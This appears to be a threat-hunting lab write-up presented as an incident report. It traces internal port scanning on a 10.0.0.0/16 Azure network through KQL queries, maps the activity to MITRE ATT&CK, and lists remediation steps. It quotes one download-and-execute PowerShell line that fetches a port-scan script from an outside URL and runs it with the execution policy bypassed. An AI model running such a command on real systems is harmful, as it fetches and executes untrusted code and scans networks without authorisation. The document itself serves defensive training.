

# Sudden Network Slowdowns Project 
# Objective:
To investigate abnormal traffic patterns originating from within the network, identify any signs of lateral movement or misuse of built-in tools (e.g., PowerShell), and validate whether an internal host is responsible for the performance degradation.

---
# Tools & Technology:
- Azure Virtual Machine
- PowerShell 
- Microsoft Defender
- KQL Query

---
# Table of contents

- [Step 1) Create a Windows virtual machine in the Azure portal](#step-1-create-a-windows-virtual-machine-in-the-azure-portal)
- [Step 2) Log into the VM and disable the Windows Firewall](#step-2-log-into-the-vm-and-disable-the-windows-firewall)
- [Step 3) Run a PowerShell command:](#step-3-run-a-powershell-command)
- [Step 4) Create a Network Security Group](#step-4-create-a-network-security-group)
- [Step 5) Login to tenable](#step-5-login-to-tenable)
- [Step 6) Run a Basic Scan: Unauthenticated](#step-6-run-a-basic-scan-unauthenticated)
- [Step 7) Run a Basic Scan: Authenticated](#step-7-run-a-basic-scan-authenticated)
- [Difference in Scan Duration](#difference-in-scan-duration)

---


### 🛡️ Incident Report: Internal Port Scanning Activity on 10.0.0.0/16 Network
## 1. Summary
Incident Title: Unauthorized Internal Port Scanning via PowerShell <br />
Date of Discovery: June 10, 2025 <br />
Reporting Team: Security Operations / Threat Hunting <br />
Impacted Network Segment: 10.0.0.0/16 <br />
Affected Host: windows-target-1 (10.0.0.5) <br />
TTPs Observed: T1046, T1059.001, T1078, T1105, T1204.002 <br />
Incident Status: Contained; Rebuilt/ Re-imaging  <br />

## 2. Preparation
### Observation:
The server team reported network performance degradation affecting older devices on the 10.0.0.0/16 internal network.

### Initial Assumption:
After ruling out external threats (e.g., DDoS), internal causes such as large file transfers or port scanning were considered. The environment allows unrestricted internal traffic and the use of scripting tools like PowerShell.

### Hypothesis:
A compromised internal host may be engaging in lateral movement or reconnaissance via port scanning.

## 3. Data Collection
Data Sources Queried:

DeviceNetworkEvents

DeviceProcessEvents

DeviceFileEvents

Focus Areas:

Failed network connections (potential scanning)

Suspicious process executions

File downloads or script execution activity

## 4. Data Analysis
### Step 1:
Analyzed DeviceNetworkEvents for failed outbound connection attempts.

kusto
Copy
Edit
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize FailedConnectionsAttempts = count() by DeviceName, LocalIP
| order by FailedConnectionsAttempts desc
Result: IP 10.0.0.5 exhibited an unusually high number of failed connections.

### Step 2:
Filtered for all failed connection timestamps for IP 10.0.0.5:

kusto
Copy
Edit
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == "10.0.0.5"
| order by Timestamp desc
Finding:
Connections were attempted to multiple ports in sequential order—indicating an automated port scan.

## 5. Investigation
### Step 3:
Pivoted to DeviceProcessEvents for host windows-target-1 and timestamp near suspicious activity:

kusto
Copy
Edit
let specificTime = datetime(2025-06-10T08:41:10.2458249Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == "windows-target-1"
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine, AccountName
Key Finding:
A PowerShell command was executed at 2025-06-10T08:37:51Z with the following line:

powershell
Copy
Edit
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
Account:
Executed by SYSTEM — not expected behavior; not triggered by any admin.

## 6. Response
Actions Taken:

Logged into the device to verify script existence.

Confirmed the file portscan.ps1 existed under C:\ProgramData.

Isolated the host from the network.

Performed a full malware scan (no malware detected).

Escalated to IT for reimaging of the device to ensure integrity.

## 7. MITRE ATT&CK Mapping
markdown
Copy
Edit
- T1046 - Network Service Discovery  
  (Port scanning activity to identify open services)

- T1059.001 - Command and Scripting Interpreter: PowerShell  
  (Execution of PowerShell script to perform scan)

- T1078 - Valid Accounts  
  (Script executed under SYSTEM account)

- T1105 - Ingress Tool Transfer  
  (Script downloaded from external URL using Invoke-WebRequest)

- T1204.002 - User Execution: Malicious File  
  (Execution of suspicious PowerShell file)

- T1562.001 - Impair Defenses (if applicable)  
  (Not confirmed, but would apply if local defenses were bypassed or modified)
## 8. Lessons Learned / Improvement
Preventive Measures:

Implement internal network segmentation to reduce lateral movement risk.

Restrict PowerShell usage via GPO or allow-listing.

Apply egress controls and file reputation filtering for outbound web requests.

Increase visibility over SYSTEM-level activities on endpoints.

Detection Enhancements:

Create alerts for abnormal outbound connection spikes.

Monitor for suspicious PowerShell usage and external script downloads.

Correlate failed connection logs with script execution patterns.

## 9. Final Status
Threat Contained: ✅

Device Isolated: ✅

Malware Scan Result: Clean

Device Action: Ticket submitted for full rebuild

Follow-up: Review PowerShell execution policies and endpoint monitoring rules


